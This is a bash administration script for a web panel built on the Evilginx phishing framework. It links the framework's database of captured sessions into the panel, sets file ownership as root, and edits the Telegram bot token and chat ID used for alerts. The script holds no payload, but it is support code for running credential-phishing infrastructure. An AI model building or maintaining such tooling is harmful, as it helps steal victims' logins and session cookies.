#!/bin/bash

# Get the directory where the script is located
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
WORKSPACE_DIR="$( cd "$SCRIPT_DIR/../../../" && pwd )"
CONFIG_SOURCE="$WORKSPACE_DIR/.evilginx/config.json"
CONFIG_SYMLINK="$SCRIPT_DIR/config.json"
EVILGINX_DB="$WORKSPACE_DIR/.evilginx/data.db"
PANEL_DB="$SCRIPT_DIR/evilginx.db"
EVILGINX_DIR="$WORKSPACE_DIR/.evilginx"

# Function to check if required directories exist
check_directories() {
    if [ ! -d "$EVILGINX_DIR" ]; then
        echo "Error: .evilginx directory not found at $EVILGINX_DIR"
        exit 1
    fi
    
    if [ ! -d "$SCRIPT_DIR" ]; then
        echo "Error: Panel data directory not found at $SCRIPT_DIR"
        exit 1
    fi
}

# Function to create backup
create_backup() {
    local file="$1"
    if [ -f "$file" ]; then
        local backup="${file}.$(date +%Y%m%d_%H%M%S).bak"
        cp "$file" "$backup" || {
            echo "Error: Failed to create backup of $file"
            exit 1
        }
        echo "Created backup: $backup"
    fi
}

# Function to check and set permissions
setup_permissions() {
    echo "Setting up permissions..."
    
    # Check if running as root
    if [ "$EUID" -ne 0 ]; then 
        echo "Please run as root (use sudo)"
        exit 1
    fi
    
    # Check if directories exist
    check_directories
    
    # Get the user running the webpanel
    PANEL_USER=$(whoami)
    
    # Set permissions for evilginx database
    if [ -f "$EVILGINX_DB" ]; then
        chmod 644 "$EVILGINX_DB" || {
            echo "Error: Failed to set permissions for evilginx database"
            exit 1
        }
        chown "$PANEL_USER:$PANEL_USER" "$EVILGINX_DB" || {
            echo "Error: Failed to change ownership of evilginx database"
            exit 1
        }
        echo "Set permissions for evilginx database"
    else
        echo "Warning: Evilginx database not found at $EVILGINX_DB"
    fi
    
    # Set permissions for panel data directory
    chmod 755 "$SCRIPT_DIR" || {
        echo "Error: Failed to set permissions for panel data directory"
        exit 1
    }
    chown "$PANEL_USER:$PANEL_USER" "$SCRIPT_DIR" || {
        echo "Error: Failed to change ownership of panel data directory"
        exit 1
    }
    echo "Set permissions for panel data directory"
    
    # Create symlink for evilginx database
    if [ -f "$EVILGINX_DB" ]; then
        # Remove existing symlink if it exists
        if [ -L "$PANEL_DB" ]; then
            rm "$PANEL_DB" || {
                echo "Error: Failed to remove existing symlink"
                exit 1
            }
        fi
        
        # Create new symlink
        ln -sf "$EVILGINX_DB" "$PANEL_DB" || {
            echo "Error: Failed to create symlink for evilginx database"
            exit 1
        }
        chown "$PANEL_USER:$PANEL_USER" "$PANEL_DB" || {
            echo "Error: Failed to change ownership of symlink"
            exit 1
        }
        echo "Created symlink for evilginx database"
    fi
    
    # Set permissions for config files
    if [ -f "$CONFIG_SOURCE" ]; then
        chmod 644 "$CONFIG_SOURCE" || {
            echo "Error: Failed to set permissions for config source"
            exit 1
        }
        chown "$PANEL_USER:$PANEL_USER" "$CONFIG_SOURCE" || {
            echo "Error: Failed to change ownership of config source"
            exit 1
        }
        echo "Set permissions for config source"
    fi
    
    if [ -L "$CONFIG_SYMLINK" ]; then
        chown "$PANEL_USER:$PANEL_USER" "$CONFIG_SYMLINK" || {
            echo "Error: Failed to change ownership of config symlink"
            exit 1
        }
        echo "Set permissions for config symlink"
    fi
    
    echo "Permission setup completed successfully"
}

# Function to update config values
update_config() {
    local bot_token="$1"
    local chat_id="$2"
    
    # Check if source config exists
    if [ ! -f "$CONFIG_SOURCE" ]; then
        echo "Error: Source config file not found at $CONFIG_SOURCE" >&2
        exit 1
    fi
    
    # Create backup before modifying
    create_backup "$CONFIG_SOURCE"
    
    # Read the current config
    local config="$(cat "$CONFIG_SOURCE")"
    
    # Update the values using jq
    echo "$config" | jq --arg token "$bot_token" --arg chat "$chat_id" \
        '.general.telegram_bot_token = $token | .general.telegram_chat_id = $chat' > "$CONFIG_SOURCE" || {
        echo "Error: Failed to update config file"
        exit 1
    }
    
    # Update symlink to reflect changes
    ln -sf "$CONFIG_SOURCE" "$CONFIG_SYMLINK" || {
        echo "Error: Failed to update config symlink"
        exit 1
    }
    echo "Settings updated successfully"
}

# Function to read current values
read_config() {
    if [ -f "$CONFIG_SOURCE" ]; then
        jq -r '{
            bot_token: .general.telegram_bot_token,
            chat_id: .general.telegram_chat_id
        }' "$CONFIG_SOURCE" || {
            echo "Error: Failed to read config file" >&2
            exit 1
        }
    else
        echo "Error: Config file not found at $CONFIG_SOURCE" >&2
        exit 1
    fi
}

# Handle command line arguments
case "$1" in
    "read")
        read_config
        ;;
    "update")
        if [ -z "$2" ] || [ -z "$3" ]; then
            echo "Error: Both bot token and chat ID are required"
            exit 1
        fi
        update_config "$2" "$3"
        ;;
    "setup")
        setup_permissions
        ;;
    *)
        echo "Usage: $0 {read|update BOT_TOKEN CHAT_ID|setup}"
        echo "  read: Read current config values"
        echo "  update BOT_TOKEN CHAT_ID: Update config values"
        echo "  setup: Set up permissions and symlinks (requires root)"
        exit 1
        ;;
esac 